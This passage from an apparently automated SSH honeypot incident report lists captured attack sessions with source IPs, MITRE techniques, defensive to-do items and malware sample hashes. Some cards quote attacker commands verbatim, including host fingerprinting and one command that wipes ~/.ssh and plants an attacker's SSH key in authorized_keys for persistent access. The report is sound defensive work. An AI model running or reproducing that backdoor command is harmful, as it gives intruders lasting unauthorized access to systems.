| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:41:08` | `cowrie.session.connect` |
| `2026-08-25 12:41:08` | `cowrie.client.version` |
| `2026-08-25 12:41:08` | `cowrie.client.kex` |
| `2026-08-25 12:41:09` | `cowrie.login.success` |
| `2026-08-25 12:41:09` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:41:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:41:09` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5868c276c95b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:41 |
| **Last Seen** | 2026-08-25 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:41:12` | `cowrie.session.connect` |
| `2026-08-25 12:41:12` | `cowrie.client.version` |
| `2026-08-25 12:41:12` | `cowrie.client.kex` |
| `2026-08-25 12:41:13` | `cowrie.login.success` |
| `2026-08-25 12:41:13` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:41:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:41:14` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007bf483214e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:41 |
| **Last Seen** | 2026-08-25 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:41:37` | `cowrie.session.connect` |
| `2026-08-25 12:41:37` | `cowrie.client.version` |
| `2026-08-25 12:41:37` | `cowrie.client.kex` |
| `2026-08-25 12:41:38` | `cowrie.login.success` |
| `2026-08-25 12:41:39` | `cowrie.session.params` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.success` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.command.input` |
| `2026-08-25 12:41:39` | `cowrie.log.closed` |
| `2026-08-25 12:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d257d37a99

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:44 |
| **Last Seen** | 2026-08-25 12:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:44:30` | `cowrie.session.connect` |
| `2026-08-25 12:44:31` | `cowrie.client.version` |
| `2026-08-25 12:44:31` | `cowrie.client.kex` |
| `2026-08-25 12:44:32` | `cowrie.login.success` |
| `2026-08-25 12:44:33` | `cowrie.session.params` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.success` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.command.input` |
| `2026-08-25 12:44:33` | `cowrie.log.closed` |
| `2026-08-25 12:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af4583bc8c7a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:47 |
| **Last Seen** | 2026-08-25 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:47:01` | `cowrie.session.connect` |
| `2026-08-25 12:47:01` | `cowrie.client.version` |
| `2026-08-25 12:47:01` | `cowrie.client.kex` |
| `2026-08-25 12:47:02` | `cowrie.login.success` |
| `2026-08-25 12:47:03` | `cowrie.session.params` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.success` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.command.input` |
| `2026-08-25 12:47:03` | `cowrie.log.closed` |
| `2026-08-25 12:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-346490474238

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:50 |
| **Last Seen** | 2026-08-25 12:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:50:43` | `cowrie.session.connect` |
| `2026-08-25 12:50:43` | `cowrie.client.version` |
| `2026-08-25 12:50:44` | `cowrie.client.kex` |
| `2026-08-25 12:50:45` | `cowrie.login.success` |
| `2026-08-25 12:50:46` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:50:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:50:46` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16cb933b88b3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 12:50 |
| **Last Seen** | 2026-08-25 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:50:48` | `cowrie.session.connect` |
| `2026-08-25 12:50:48` | `cowrie.client.version` |
| `2026-08-25 12:50:49` | `cowrie.client.kex` |
| `2026-08-25 12:50:50` | `cowrie.login.success` |
| `2026-08-25 12:50:50` | `cowrie.direct-tcpip.request` |
| `2026-08-25 12:50:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 12:50:50` | `cowrie.direct-tcpip.data` |
| `2026-08-25 12:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caade1d7f7e3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:51 |
| **Last Seen** | 2026-08-25 12:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:51:39` | `cowrie.session.connect` |
| `2026-08-25 12:51:40` | `cowrie.client.version` |
| `2026-08-25 12:51:40` | `cowrie.client.kex` |
| `2026-08-25 12:51:43` | `cowrie.login.success` |
| `2026-08-25 12:51:44` | `cowrie.session.params` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.success` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:44` | `cowrie.command.input` |
| `2026-08-25 12:51:45` | `cowrie.log.closed` |
| `2026-08-25 12:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4afae8f306

| Field | Detail |
|---|---|
| **Source IP** | `14.29.208[.]128` |
| **First Seen** | 2026-08-25 12:53 |
| **Last Seen** | 2026-08-25 12:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:53:08` | `cowrie.session.connect` |
| `2026-08-25 12:53:10` | `cowrie.client.version` |
| `2026-08-25 12:53:10` | `cowrie.client.kex` |
| `2026-08-25 12:53:11` | `cowrie.login.success` |
| `2026-08-25 12:53:12` | `cowrie.session.params` |
| `2026-08-25 12:53:12` | `cowrie.command.input` |
| `2026-08-25 12:53:12` | `cowrie.command.failed` |
| `2026-08-25 12:53:13` | `cowrie.log.closed` |
| `2026-08-25 12:53:14` | `cowrie.session.params` |
| `2026-08-25 12:53:14` | `cowrie.command.input` |
| `2026-08-25 12:53:14` | `cowrie.session.file_download` |
| `2026-08-25 12:53:14` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.208[.]128` to AbuseIPDB if not already reported
- [ ] Block `14.29.208[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20daf3a9b78f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 12:53 |
| **Last Seen** | 2026-08-25 12:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 12:53:25` | `cowrie.session.connect` |
| `2026-08-25 12:53:25` | `cowrie.client.version` |
| `2026-08-25 12:53:25` | `cowrie.client.kex` |
| `2026-08-25 12:53:27` | `cowrie.login.success` |
| `2026-08-25 12:53:28` | `cowrie.session.params` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.success` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:28` | `cowrie.command.input` |
| `2026-08-25 12:53:29` | `cowrie.log.closed` |
| `2026-08-25 12:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]44` | **12** | 2026-08-25 10:58 | 2026-08-25 11:43 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `134.209.229[.]23` | **8** | 2026-08-25 11:16 | 2026-08-25 12:54 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-25 11:02 | 2026-08-25 12:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | **3** | 2026-08-25 11:58 | 2026-08-25 12:49 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `116.206.193[.]44` | **2** | 2026-08-25 11:24 | 2026-08-25 11:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.106.213[.]5` | **2** | 2026-08-25 12:23 | 2026-08-25 12:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-08-25 11:24 | 2026-08-25 11:24 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.118[.]107` | 1 | 2026-08-25 12:41 | 2026-08-25 12:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.208[.]128` | 1 | 2026-08-25 12:53 | 2026-08-25 12:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.101.149[.]231` | 1 | 2026-08-25 12:07 | 2026-08-25 12:07 | 1s | 0 | `T1592` | 🟢 LOW |
| `217.164.155[.]173` | 1 | 2026-08-25 12:02 | 2026-08-25 12:03 | 31s | 0 | `T1592` | 🟢 LOW |
| `31.43.49[.]75` | 1 | 2026-08-25 12:15 | 2026-08-25 12:15 | 13s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-25 12:35 | 2026-08-25 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | 1 | 2026-08-25 12:16 | 2026-08-25 12:16 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
